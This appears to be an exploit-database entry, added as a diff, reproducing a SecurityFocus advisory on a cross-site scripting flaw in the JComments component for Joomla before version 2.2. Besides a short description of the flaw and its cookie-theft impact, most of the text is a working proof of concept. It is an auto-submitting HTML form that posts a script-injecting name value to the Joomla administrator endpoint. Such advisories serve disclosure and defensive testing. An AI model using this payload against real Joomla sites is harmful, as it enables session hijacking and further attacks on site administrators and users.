@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/40230/info
+
+The JComments component for Joomla! is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Versions prior to JComments 2.2 are vulnerable. 
+
+<form method="POST" action="http://joomla/administrator/index.php" name="main"> <input type="hidden" name="name" value='ComntrName"><script>alert(document.cookie)</script>'> <input type="hidden" name="email" value="example@example.com"> <input type="hidden" name="comment" value="comment text"> <input type="hidden" name="published" value="1"> <input type="hidden" name="option" value="com_jcomments"> <input type="hidden" name="id" value="1"> <input type="hidden" name="task" value="save"> </form> <script> document.main.submit(); </script> 
